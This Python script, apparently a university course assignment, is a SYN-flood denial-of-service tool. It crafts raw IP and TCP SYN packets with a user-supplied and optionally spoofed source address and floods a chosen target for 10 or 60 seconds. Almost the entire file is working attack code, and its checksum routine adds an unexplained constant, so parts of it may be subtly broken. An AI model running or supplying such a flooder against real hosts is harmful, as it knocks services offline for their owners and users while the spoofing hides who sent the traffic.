# Muhammad Huzaifa
# 20i0604
# DOS Script 
# Networks and Cyber II

import time
import socket, sys      # Importing
from struct import *    # Required
import argparse         # Libraries
from termcolor import colored

# Description string for Argparse
desc = "\n" + r"""
""""\t\t\t\t""""  ___   ___  ___ 
""""\t\t\t\t"""" |   \ / _ \/ __|
""""\t\t\t\t"""" | |) | (_) \__ \\
""""\t\t\t\t"""" |___/ \___/|___/
""""\n\t\tArgparser is beng used to provide source and Destination IPs\n\t\t\tas well as Port numbers along with\n\t\t     rates (high and low) for severity of attack"

print(colored(desc, 'red', attrs=['bold']))
time.sleep(1)
# use python Dos.py -h for help menu
parser = argparse.ArgumentParser(desc)
#Getting the arguments from the User
parser.add_argument("-sip", "--sourceIP", help = "Enter Source IP address")
parser.add_argument("-sport", "--sourcePort", help = "Enter Source Port address")
parser.add_argument("-dip", "--destIP", help = "Enter Destination IP address")
parser.add_argument("-dport", "--destPort", help = "Enter Destination Port address")
parser.add_argument("-hr", "--highrate", action = 'store_true', help = "To set high Severity Dos Attack")
parser.add_argument("-lr", "--lowrate", action='store_true', help = "To set low Severity Dos Attack")
args=parser.parse_args()
# Function for calculating the checksum of packet
def checksum(msg):
    # Calculate the 16-bit one's complement of the one's complement sum
    # of all 16-bit words in the msg
    s = 0
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i + 1] << 8)
        s += w
        s = (s & 0xffff) + (s >> 16)

    # Take the one's complement of the sum
    checksum = ~s & 0xffff
    checksum += (0x400)

    return checksum

 
#create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except (socket.error) as msg:
    print ('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()
print ("Socket Created Successfully!\n") 

packet = '';
# Source and Destination IPs for Packet
source_ip = args.sourceIP
dest_ip = args.destIP # or socket.gethostbyname('www.google.com')
 
# ip header fields
ip_ihl = 5
ip_ver = 4
ip_tos = 0
ip_tot_len = 0  # kernel will fill the correct total length
ip_id = 54321   #Id of this packet
ip_frag_off = 0
ip_ttl = 255
ip_proto = socket.IPPROTO_TCP
ip_check = 0    # kernel will fill the correct checksum
ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
ip_daddr = socket.inet_aton ( dest_ip )

ip_ihl_ver = (ip_ver << 4) + ip_ihl

# the ! in the pack format string means network order
ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

# tcp header fields
#Source and Destination ports from arguments from the user
tcp_source = int(args.sourcePort)   # source port
tcp_dest = int(args.destPort)   # destination port
tcp_seq = 454
tcp_ack_seq = 0
tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
#tcp flags
tcp_fin = 0
tcp_syn = 1
tcp_rst = 0
tcp_psh = 0
tcp_ack = 0
tcp_urg = 0
tcp_window = socket.htons (5840)    #   maximum allowed window size
tcp_check = 0
tcp_urg_ptr = 0

tcp_offset_res = (tcp_doff << 4) + 0
tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

# the ! in the pack format string means network order
tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

#user_data = b'Hello, how are you'
user_data=b'test'
# pseudo header fields
source_address = socket.inet_aton( source_ip )
dest_address = socket.inet_aton(dest_ip)
placeholder = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_header) + len(user_data)
# Packing TCP header
psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
psh = psh + tcp_header 
# Getting Checksum for the packet
tcp_check = checksum(psh)
# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
# final full packet - syn packets dont have any data
packet = ip_header + tcp_header
sent = 0
#Send the packet finally - the port specified has no effect
st = time.time()
while(1):
    end = time.time()
    # Checking if to perform low rate or high rate dos attack
    if args.lowrate == True:
        if(end-st <10):#Performin low rate dos for only 10 secs
            s.sendto(packet, (dest_ip , 0 )) # sending packets to destination ip
            sent = sent + 1
            print(f"Packet no {sent} sent.")
        else:
            exit()# exiting DOS
    else:
        if(end-st <60):#Performin high rate dos for 60 secs
            s.sendto(packet, (dest_ip , 0 ))
            sent = sent + 1
            print(f"Packet no {sent} sent.")# sending packets to destination ip
        else:
            exit()# Exiting Dos